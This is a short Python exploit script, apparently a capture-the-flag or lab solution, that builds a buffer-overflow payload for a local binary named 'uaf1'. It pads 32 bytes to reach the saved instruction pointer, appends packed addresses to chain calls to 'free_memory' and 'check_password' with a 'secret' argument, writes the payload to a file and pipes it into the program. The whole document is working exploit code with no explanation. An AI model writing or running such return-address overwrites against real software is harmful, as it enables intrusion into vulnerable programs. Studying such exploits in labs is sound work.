import struct
import os

secret = 0x804b410

p_eip = 32

free_memory = 0x804858b

check_password = 0x8048661

atk_vector = "A"*p_eip
atk_vector += struct.pack("I", free_memory)
atk_vector += struct.pack("I", check_password)
atk_vector += struct.pack("I", secret)
atk_vector += struct.pack("I", secret)
atk_vector += '\n'

f = open('fla', 'w+')
f.write(atk_vector)
f.close()

os.system("cat {} | ./uaf1".format('fla'))

